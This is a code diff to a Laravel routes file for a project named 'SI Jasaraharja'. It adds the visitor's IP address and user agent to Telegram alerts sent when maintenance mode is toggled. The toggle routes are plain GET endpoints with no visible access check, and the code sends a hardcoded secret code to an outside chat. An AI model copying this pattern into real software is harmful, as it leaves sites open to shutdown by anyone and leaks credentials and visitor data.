@@ -59,11 +59,19 @@ Route::post('/laporan-cetak', [LaporanControler::class, 'cetak'])->name('laporan
 
 // Route untuk mengaktifkan mode maintenance
 Route::get('/maintenance/on', function () {
+	// Mendapatkan IP Address pengguna
+	$ipAddress = request()->ip();
+
+	// Mendapatkan informasi perangkat pengguna
+	$userAgent = request()->userAgent();
 	$secretCode = 'azvadenTech'; // Ganti dengan secret code yang sesuai
 	$message = '*Project: SI Jasaraharja*' . PHP_EOL .
 		'_Website dalam mode Maintenance_❌' . PHP_EOL .
 		'Domain: ' . request()->getHttpHost() . PHP_EOL .
-		'Secret Code: ' . $secretCode;
+		'Secret Code: ' . $secretCode . PHP_EOL .
+		'IP Address: ' . $ipAddress . PHP_EOL . PHP_EOL .
+		'User Agent: ' . PHP_EOL . $userAgent;
+
 	$chat_id = '5163645049'; // Ganti dengan ID chat yang sesuai
 
 	Telegram::sendMessage([
@@ -81,9 +89,16 @@ Route::get('/maintenance/on', function () {
 // Route untuk menonaktifkan mode maintenance
 Route::get('/maintenance/off', function () {
 	Artisan::call('up');
+	// Mendapatkan IP Address pengguna
+	$ipAddress = request()->ip();
+
+	// Mendapatkan informasi perangkat pengguna
+	$userAgent = request()->userAgent();
 	$message = '*Project: SI Jasaraharja*' . PHP_EOL .
-		'_Website dalam mode Non-Maintenance_✅' . PHP_EOL .
-		'Domain: ' . request()->getHttpHost();
+		'_Website dalam mode Non-Maintenance_ ✅' . PHP_EOL .
+		'Domain: ' . request()->getHttpHost() . PHP_EOL .
+		'IP Address: ' . $ipAddress . PHP_EOL . PHP_EOL .
+		'User Agent: ' . PHP_EOL . $userAgent;
 	$chat_id = '5163645049'; // Ganti dengan ID chat yang sesuai
 
 	Telegram::sendMessage([
